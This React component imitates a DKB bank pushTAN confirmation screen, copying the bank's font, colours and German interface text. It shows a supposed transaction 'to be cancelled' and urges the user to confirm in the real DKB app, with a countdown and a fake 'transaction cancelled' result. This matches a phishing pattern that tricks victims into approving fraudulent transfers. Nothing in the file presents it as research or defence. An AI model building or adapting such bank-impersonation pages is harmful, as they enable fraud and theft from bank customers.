import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface PushTANScreenProps {
  tanType: TANType;
  transactionDetails?: TransactionDetails;
  onConfirm: () => void;
  onCancel?: () => void;
}

const PushTANScreen: React.FC<PushTANScreenProps> = ({ 
  tanType,
  transactionDetails = {}, 
  onConfirm, 
  onCancel
}) => {
  const [isWaiting, setIsWaiting] = useState(true);
  const [countdown, setCountdown] = useState(120);
  const [isLoading, setIsLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          setIsWaiting(false);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleConfirm = async () => {
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 1500));
    setIsLoading(false);
    onConfirm();
  };

  if (isLoading) {
    return (
      <Loading 
        message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'pushTAN wird verarbeitet...'}
        type="processing"
        showProgress={true}
        duration={2}
      />
    );
  }

  return (
    <div className="dkb-main-layout" style={{
      minHeight: '100vh',
      backgroundColor: '#09141c',
      fontFamily: 'DKBEuclid, Arial, sans-serif',
      color: '#edf4f7',
      WebkitFontSmoothing: 'antialiased',
      MozOsxFontSmoothing: 'grayscale'
    }}>
      <div style={{
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        padding: isMobile ? '32px 16px' : '64px 16px',
        minHeight: '100vh'
      }}>
        
        {/* Main TAN Card - DKB Dark Theme */}
        <div style={{
          backgroundColor: '#131f29',
          border: '1px solid rgba(181, 223, 255, 0.2)',
          borderRadius: '12px',
          width: '100%',
          maxWidth: '600px',
          padding: isMobile ? '24px' : '32px',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center'
        }}>
          
          {/* Title */}
          <h1 style={{
            color: '#edf4f7',
            fontSize: isMobile ? '1.75rem' : '2.25rem',
            fontWeight: '600',
            margin: '0 0 32px 0',
            fontFamily: 'DKBEuclid, Arial, sans-serif',
            textAlign: 'center',
            letterSpacing: '0.0125rem'
          }}>
            {tanType === 'TRANSACTION_TAN' ? 'pushTAN Stornierung' : 'pushTAN Anmeldung'}
          </h1>
          
          {/* Instruction Box */}
          <div style={{
            backgroundColor: '#122534',
            border: '1px solid rgba(20, 141, 234, 0.24)',
            borderRadius: '8px',
            padding: '20px',
            marginBottom: '32px',
            width: '100%',
            textAlign: 'center'
          }}>
            <p style={{
              margin: '0',
              fontSize: isMobile ? '14px' : '16px',
              color: 'rgba(204, 233, 255, 0.62)',
              fontFamily: 'DKBEuclid, Arial, sans-serif',
              lineHeight: '1.5',
              letterSpacing: '0.0125rem'
            }}>
              {tanType === 'TRANSACTION_TAN' 
                ? 'Bestätigen Sie die Stornierung der Transaktion in Ihrer DKB Banking-App.'
                : 'Bestätigen Sie Ihren Anmeldeversuch in Ihrer DKB Banking-App.'
              }
            </p>
          </div>

          {/* Transaction Details Card - only for TRANSACTION_TAN */}
          {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
            <div style={{
              backgroundColor: '#122534',
              border: '1px solid #148DEA',
              borderRadius: '8px',
              padding: '24px',
              marginBottom: '32px',
              width: '100%'
            }}>
              <h2 style={{
                color: '#148DEA',
                fontSize: isMobile ? '1.25rem' : '1.5rem',
                fontWeight: '600',
                margin: '0 0 20px 0',
                fontFamily: 'DKBEuclid, Arial, sans-serif',
                textAlign: 'center',
                letterSpacing: '0.0125rem'
              }}>
                Zu stornierende Transaktion
              </h2>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                <div style={{ 
                  display: 'flex', 
                  justifyContent: 'space-between', 
                  alignItems: 'center',
                  paddingBottom: '12px',
                  borderBottom: '1px solid rgba(181, 223, 255, 0.2)'
                }}>
                  <span style={{
                    color: 'rgba(204, 233, 255, 0.62)',
                    fontSize: '14px',
                    fontFamily: 'DKBEuclid, Arial, sans-serif',
                    letterSpacing: '0.0125rem'
                  }}>Betrag:</span>
                  <span style={{
                    color: '#148DEA',
                    fontSize: '18px',
                    fontFamily: 'DKBEuclid, Arial, sans-serif',
                    fontWeight: '600',
                    letterSpacing: '0.0125rem'
                  }}>{transactionDetails.amount}</span>
                </div>
                
                {transactionDetails.recipient && (
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '12px',
                    borderBottom: '1px solid rgba(181, 223, 255, 0.2)'
                  }}>
                    <span style={{
                      color: 'rgba(204, 233, 255, 0.62)',
                      fontSize: '14px',
                      fontFamily: 'DKBEuclid, Arial, sans-serif',
                      letterSpacing: '0.0125rem'
                    }}>Empfänger:</span>
                    <span style={{
                      color: '#edf4f7',
                      fontSize: '14px',
                      fontFamily: 'DKBEuclid, Arial, sans-serif',
                      textAlign: 'right',
                      maxWidth: '60%',
                      letterSpacing: '0.0125rem'
                    }}>{transactionDetails.recipient}</span>
                  </div>
                )}
                
                {transactionDetails.iban && (
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '12px',
                    borderBottom: '1px solid rgba(181, 223, 255, 0.2)'
                  }}>
                    <span style={{
                      color: 'rgba(204, 233, 255, 0.62)',
                      fontSize: '14px',
                      fontFamily: 'DKBEuclid, Arial, sans-serif',
                      letterSpacing: '0.0125rem'
                    }}>IBAN:</span>
                    <span style={{
                      color: '#edf4f7',
                      fontSize: '14px',
                      fontFamily: 'monospace',
                      textAlign: 'right',
                      letterSpacing: '0.05rem'
                    }}>{transactionDetails.iban}</span>
                  </div>
                )}
                
                {transactionDetails.reference && (
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center'
                  }}>
                    <span style={{
                      color: 'rgba(204, 233, 255, 0.62)',
                      fontSize: '14px',
                      fontFamily: 'DKBEuclid, Arial, sans-serif',
                      letterSpacing: '0.0125rem'
                    }}>Verwendungszweck:</span>
                    <span style={{
                      color: '#edf4f7',
                      fontSize: '14px',
                      fontFamily: 'DKBEuclid, Arial, sans-serif',
                      textAlign: 'right',
                      maxWidth: '60%',
                      letterSpacing: '0.0125rem'
                    }}>{transactionDetails.reference}</span>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Status Section */}
          <div style={{
            backgroundColor: '#122534',
            border: '1px solid rgba(181, 223, 255, 0.2)',
            borderRadius: '8px',
            padding: '32px',
            textAlign: 'center',
            marginBottom: '32px',
            width: '100%'
          }}>
            {isWaiting ? (
              <div>
                {/* DKB Loading Spinner */}
                <div style={{
                  width: '48px',
                  height: '48px',
                  border: '3px solid rgba(181, 223, 255, 0.2)',
                  borderTop: '3px solid #148DEA',
                  borderRadius: '50%',
                  animation: 'spin 1s linear infinite',
                  margin: '0 auto 24px auto'
                }} />
                
                <h3 style={{
                  color: '#148DEA',
                  fontSize: isMobile ? '1.125rem' : '1.25rem',
                  fontWeight: '600',
                  margin: '0 0 16px 0',
                  fontFamily: 'DKBEuclid, Arial, sans-serif',
                  letterSpacing: '0.0125rem'
                }}>
                  {tanType === 'TRANSACTION_TAN' ? 'Warten auf Stornierung...' : 'Warten auf Anmeldung...'}
                </h3>
                
                <p style={{
                  color: 'rgba(204, 233, 255, 0.62)',
                  fontSize: '14px',
                  margin: '0 0 16px 0',
                  fontFamily: 'DKBEuclid, Arial, sans-serif',
                  letterSpacing: '0.0125rem'
                }}>
                  Bitte bestätigen Sie in Ihrer DKB App.
                </p>
                
                <p style={{
                  color: '#ff6b6b',
                  fontSize: '14px',
                  margin: '0',
                  fontFamily: 'DKBEuclid, Arial, sans-serif',
                  fontWeight: '500',
                  letterSpacing: '0.0125rem'
                }}>
                  Timeout in: {formatTime(countdown)}
                </p>
              </div>
            ) : (
              <div>
                {/* Success Icon */}
                <div style={{
                  width: '48px',
                  height: '48px',
                  backgroundColor: '#10B981',
                  borderRadius: '50%',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  margin: '0 auto 24px auto'
                }}>
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3">
                    <path d="M20 6L9 17l-5-5"/>
                  </svg>
                </div>
                
                <h3 style={{
                  color: '#10B981',
                  fontSize: isMobile ? '1.125rem' : '1.25rem',
                  fontWeight: '600',
                  margin: '0 0 16px 0',
                  fontFamily: 'DKBEuclid, Arial, sans-serif',
                  letterSpacing: '0.0125rem'
                }}>
                  {tanType === 'TRANSACTION_TAN' ? 'Transaktion storniert' : 'Anmeldung bestätigt'}
                </h3>
                
                <p style={{
                  color: '#edf4f7',
                  fontSize: '14px',
                  margin: '0',
                  fontFamily: 'DKBEuclid, Arial, sans-serif',
                  letterSpacing: '0.0125rem'
                }}>
                  Sie können nun fortfahren.
                </p>
              </div>
            )}
          </div>

          {/* Action Buttons */}
          <div style={{
            display: 'flex',
            flexDirection: isMobile ? 'column' : 'row',
            justifyContent: 'center',
            alignItems: 'center',
            gap: '16px',
            width: '100%',
            marginBottom: '16px'
          }}>
            <button
              onClick={handleConfirm}
              disabled={isLoading}
              style={{
                backgroundColor: isLoading ? '#6c757d' : '#148DEA',
                color: '#ffffff',
                border: 'none',
                padding: '12px 24px',
                borderRadius: '6px',
                fontFamily: 'DKBEuclid, Arial, sans-serif',
                fontWeight: '600',
                fontSize: '16px',
                cursor: isLoading ? 'not-allowed' : 'pointer',
                transition: 'background-color 0.2s ease',
                width: isMobile ? '100%' : 'auto',
                minWidth: '180px',
                letterSpacing: '0.0125rem'
              }}
              onMouseEnter={(e) => {
                if (!isLoading) {
                  (e.target as HTMLButtonElement).style.backgroundColor = '#134e8a';
                }
              }}
              onMouseLeave={(e) => {
                if (!isLoading) {
                  (e.target as HTMLButtonElement).style.backgroundColor = '#148DEA';
                }
              }}
            >
              {isWaiting 
                ? (tanType === 'TRANSACTION_TAN' ? 'Manuell stornieren' : 'Manuell bestätigen')
                : 'Weiter'
              }
            </button>
            
            {onCancel && (
              <button
                onClick={onCancel}
                style={{
                  backgroundColor: 'transparent',
                  color: '#148DEA',
                  border: '1px solid #148DEA',
                  padding: '12px 24px',
                  borderRadius: '6px',
                  fontFamily: 'DKBEuclid, Arial, sans-serif',
                  fontWeight: '600',
                  fontSize: '16px',
                  cursor: 'pointer',
                  transition: 'all 0.2s ease',
                  width: isMobile ? '100%' : 'auto',
                  minWidth: '180px',
                  letterSpacing: '0.0125rem'
                }}
                onMouseEnter={(e) => {
                  (e.target as HTMLButtonElement).style.backgroundColor = '#148DEA';
                  (e.target as HTMLButtonElement).style.color = '#ffffff';
                }}
                onMouseLeave={(e) => {
                  (e.target as HTMLButtonElement).style.backgroundColor = 'transparent';
                  (e.target as HTMLButtonElement).style.color = '#148DEA';
                }}
              >
                {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
              </button>
            )}
          </div>

          {/* Footer Info */}
          <div style={{ textAlign: 'center' }}>
            <p style={{
              color: 'rgba(204, 233, 255, 0.62)',
              fontSize: '12px',
              margin: '0',
              fontFamily: 'DKBEuclid, Arial, sans-serif',
              letterSpacing: '0.0125rem'
            }}>
              Probleme mit der App? Kontaktieren Sie den DKB Kundenservice.
            </p>
          </div>
        </div>
      </div>

      <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
};

export { PushTANScreen };
